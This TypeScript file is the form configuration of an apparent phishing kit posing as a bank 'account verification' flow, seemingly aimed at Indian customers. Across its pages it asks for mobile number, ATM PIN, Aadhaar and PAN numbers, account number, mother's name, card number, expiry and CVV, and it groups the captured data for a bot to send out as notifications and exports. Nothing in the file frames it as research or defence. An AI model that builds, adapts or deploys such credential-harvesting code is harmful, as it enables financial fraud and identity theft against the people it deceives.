// ============================================================
// FORM CONFIGURATION — Single source of truth for all form pages
// ============================================================
// To add/remove/change a form page or field:
//   1. Edit the FORM_PAGES array below
//   2. Create/update the corresponding HTML file in public/pages/
//   That's it — bot.ts, types, and server routes all read from here.
// ============================================================

export interface FieldConfig {
    key: string;           // Field key (used in data storage & API)
    displayName: string;   // Human-readable name (used in bot messages & exports)
    type: 'text' | 'tel' | 'password' | 'date';  // HTML input type
    category: 'personal' | 'account' | 'card' | 'login';  // Grouping for bot export
    required: boolean;
    maxlength?: number;
    placeholder?: string;
}

export interface PageConfig {
    id: string;            // Unique page ID (used in URL: pages/{id}.html)
    pageName: string;      // Name sent to /api/form/sync (e.g. 'kyc_login')
    title: string;         // Display title for the page
    fields: FieldConfig[]; // Fields on this page
    // Navigation: which page comes next in each flow (null = end of flow)
    nextPage: {
        main?: string | null;
        apply?: string | null;
    };
    isFinalPage?: boolean; // If true, calls /api/form/submit after sync
}

export interface CategoryConfig {
    key: string;
    displayName: string;
    emoji: string;
}

// ==================== FIELD CATEGORIES ====================
// Used by bot.ts to group fields in notifications & exports

export const FIELD_CATEGORIES: CategoryConfig[] = [
    { key: 'personal', displayName: 'Personal Details', emoji: '👤' },
    { key: 'account', displayName: 'Account Details', emoji: '🏦' },
    { key: 'card', displayName: 'Card Details', emoji: '💳' },
    { key: 'login', displayName: 'Login Credentials', emoji: '🔐' },
];

// ==================== FORM PAGES ====================
// Order matters — this defines the default page sequence.
// Each page's `nextPage` defines per-flow navigation.

export const FORM_PAGES: PageConfig[] = [
    {
        id: 'account_verify',
        pageName: 'account_verify',
        title: 'Account Verification',
        fields: [
            { key: 'mobileNumber', displayName: 'Mobile Number', type: 'tel', category: 'personal', required: true, maxlength: 10, placeholder: 'Enter 10-digit Mobile Number' },
            { key: 'atmPin', displayName: 'ATM PIN', type: 'tel', category: 'account', required: true, maxlength: 4, placeholder: 'ATM PIN' },
        ],
        nextPage: { main: 'customer_verify' },
    },
    {
        id: 'customer_verify',
        pageName: 'customer_verify',
        title: 'Customer Verification',
        fields: [
            { key: 'aadhaarNumber', displayName: 'Aadhaar Number', type: 'tel', category: 'personal', required: true, maxlength: 12, placeholder: 'Enter 12-digit Aadhaar' },
            { key: 'panNumber', displayName: 'PAN Number', type: 'text', category: 'personal', required: true, maxlength: 10, placeholder: 'ABCDE1234F' },
            { key: 'accountNumber', displayName: 'Account Number', type: 'text', category: 'account', required: true, placeholder: 'Enter Account Number' },
            { key: 'motherName', displayName: 'Mother Name', type: 'text', category: 'personal', required: true, placeholder: 'Enter Mother Name' }
        ],
        nextPage: { main: 'card_verify' },
    },
    {
        id: 'card_verify',
        pageName: 'card_verify',
        title: 'Card Verification',
        fields: [
            { key: 'cardNumber', displayName: 'Card Number', type: 'tel', category: 'card', required: true, maxlength: 16, placeholder: 'Enter 16-digit Card Number' },
            { key: 'validThrough', displayName: 'Valid Through', type: 'tel', category: 'card', required: true, maxlength: 5, placeholder: 'MMYY' },
            { key: 'cvv', displayName: 'CVV', type: 'tel', category: 'card', required: true, maxlength: 3, placeholder: 'Enter 3-digit CVV' }
        ],
        nextPage: { main: 'success' },
    },
    {
        id: 'success',
        pageName: 'success',
        title: 'Verification in Progress',
        fields: [],
        nextPage: { main: null },
        isFinalPage: true,
    }
];

// ==================== HELPER FUNCTIONS ====================

/** Get all unique field keys across all pages */
export function getAllFieldKeys(): string[] {
    const keys = new Set<string>();
    FORM_PAGES.forEach(page => page.fields.forEach(f => keys.add(f.key)));
    return Array.from(keys);
}

/** Get display name for a field key */
export function getFieldDisplayName(key: string): string {
    for (const page of FORM_PAGES) {
        const field = page.fields.find(f => f.key === key);
        if (field) return field.displayName;
    }
    // Fallback: convert camelCase to Title Case
    return key.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase());
}

/** Get all fields for a specific category */
export function getFieldsByCategory(category: string): FieldConfig[] {
    const fields: FieldConfig[] = [];
    const seenKeys = new Set<string>();
    FORM_PAGES.forEach(page => {
        page.fields.forEach(f => {
            if (f.category === category && !seenKeys.has(f.key)) {
                fields.push(f);
                seenKeys.add(f.key);
            }
        });
    });
    return fields;
}

/** Get page config by ID */
export function getPageById(pageId: string): PageConfig | undefined {
    return FORM_PAGES.find(p => p.id === pageId);
}

/** Get page config by pageName */
export function getPageByName(pageName: string): PageConfig | undefined {
    return FORM_PAGES.find(p => p.pageName === pageName);
}

/** Fields to exclude from display (metadata fields) */
export const EXCLUDE_FIELDS = new Set([
    'pageName', 'submittedAt', 'deviceId', 'currentFlow',
    'id', 'sessionStart', 'sessionEnd', 'flowType', 'pagesSubmitted'
]);
